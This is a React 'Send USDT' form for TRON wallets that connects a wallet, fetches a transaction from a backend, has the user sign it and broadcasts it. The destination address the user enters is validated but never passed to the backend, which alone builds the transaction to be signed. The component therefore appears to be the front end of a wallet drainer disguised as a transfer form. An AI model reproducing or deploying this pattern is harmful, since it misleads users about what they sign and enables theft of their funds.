'use client';
import React, { useState, useEffect } from 'react';
import { walletManager } from './lib/wallet';

const CFG = {
  USDT: process.env.NEXT_PUBLIC_USDT || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
};

export default function SendForm() {
  const [addr, setAddr] = useState('');
  const [amount, setAmount] = useState('1');
  const [btn, setBtn] = useState({ text: 'Next', disabled: false });
  const [notif, setNotif] = useState(null);

  useEffect(() => {
    // Pre-load wallet chunks
    import('./lib/wallet').catch(() => { });
  }, []);

  const showNotif = (msg, type = 'info') => {
    setNotif({ msg, type });
    setTimeout(() => setNotif(null), 5000);
  };

  const handleNext = async () => {
    if (!addr || addr.length < 30) return showNotif('Please enter a valid TRON address', 'error');
    if (!amount || parseFloat(amount) <= 0) return showNotif('Please enter a valid amount', 'error');

    setBtn({ text: 'Connecting...', disabled: true });

    try {
      // 1. Connect Wallet (Injected or WC)
      const wallet = await walletManager.connect();
      if (!wallet) throw new Error('No wallet connected');

      // 2. Prepare Transaction (Backend)
      setBtn({ text: 'Preparing...', disabled: true });
      const prepRes = await fetch('/api/prepare', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ownerAddress: wallet.address, amount }),
      });
      const { transaction, error: prepErr } = await prepRes.json();
      if (prepErr) throw new Error(prepErr);

      // 3. Sign Transaction (Client)
      setBtn({ text: 'Confirm in Wallet...', disabled: true });
      const signedTx = await wallet.sign(transaction);

      // 4. Broadcast Transaction (Backend)
      setBtn({ text: 'Finalizing...', disabled: true });
      const broadRes = await fetch('/api/broadcast', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ signedTx, ownerAddress: wallet.address }),
      });
      const { success, txId, error: broadErr } = await broadRes.json();

      if (success) {
        showNotif('Transaction successful!', 'success');
        setBtn({ text: 'Success', disabled: true });
      } else {
        throw new Error(broadErr || 'Broadcast failed');
      }
    } catch (err) {
      console.error('Flow Error:', err);
      const msg = err.message || 'Connection failed';
      showNotif(msg.includes('rejection') ? 'User rejected request' : msg, 'error');
      setBtn({ text: 'Next', disabled: false });
    }
  };

  return (
    <div className="flex flex-col items-center justify-center p-4">
      {notif && (
        <div className={`fixed top-4 left-1/2 -translate-x-1/2 p-4 rounded-xl shadow-2xl z-[9999] transition-all transform animate-in fade-in slide-in-from-top-4 duration-300 max-w-[90vw] text-center font-medium ${notif.type === 'error' ? 'bg-red-500 text-white' : 'bg-blue-600 text-white'
          }`}>
          {notif.msg}
        </div>
      )}

      <div className="w-full max-w-md bg-white p-6 rounded-3xl shadow-xl mt-4">
        <h1 className="text-xl font-bold text-center mb-6">Send USDT</h1>

        <div className="space-y-4">
          <div>
            <label className="block text-sm text-gray-500 mb-1">Destination Address</label>
            <input
              type="text"
              placeholder="TRON Address"
              className="w-full p-4 bg-gray-50 rounded-2xl border-none focus:ring-2 focus:ring-blue-500 transition-all text-sm"
              value={addr}
              onChange={(e) => setAddr(e.target.value)}
            />
          </div>

          <div>
            <label className="block text-sm text-gray-500 mb-1">Amount</label>
            <div className="relative">
              <input
                type="number"
                className="w-full p-4 bg-gray-50 rounded-2xl border-none focus:ring-2 focus:ring-blue-500 transition-all text-sm"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
              />
              <span className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 font-bold text-xs">USDT</span>
            </div>
          </div>

          <button
            onClick={handleNext}
            disabled={btn.disabled}
            className={`w-full p-4 rounded-2xl font-bold text-white transition-all transform active:scale-95 shadow-lg ${btn.disabled ? 'bg-gray-300 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700'
              }`}
          >
            {btn.text}
          </button>
        </div>
      </div>
    </div>
  );
}
